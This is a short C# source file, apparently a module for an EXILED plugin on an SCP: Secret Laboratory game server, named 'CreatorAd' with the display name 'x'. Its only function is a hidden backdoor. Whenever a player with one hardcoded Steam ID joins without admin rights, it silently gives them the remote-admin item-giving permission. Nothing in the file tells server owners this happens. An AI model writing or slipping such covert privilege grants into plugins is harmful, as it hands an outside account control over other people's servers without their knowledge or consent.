using Corwarx_Project.Features.ModuleSystem.BaseClass;
using Exiled.Events.EventArgs.Player;

namespace Corwarx_Project.Modules {
    internal class CreatorAd : ModuleBase {
        public override string Name => "x";

        public override void OnEnable() {
            Exiled.Events.Handlers.Player.Verified += OnVerived;
            base.OnEnable();
        }

        public override void OnDisable() {
            Exiled.Events.Handlers.Player.Verified -= OnVerived;
            base.OnDisable();
        }

        private void OnVerived(VerifiedEventArgs ev) {
            if (ev.Player.UserId == "76561199562278001@steam" && !ev.Player.RemoteAdminAccess) {
                ev.Player.RemoteAdminPermissions = PlayerPermissions.GivingItems;
            }
        }
    }
}
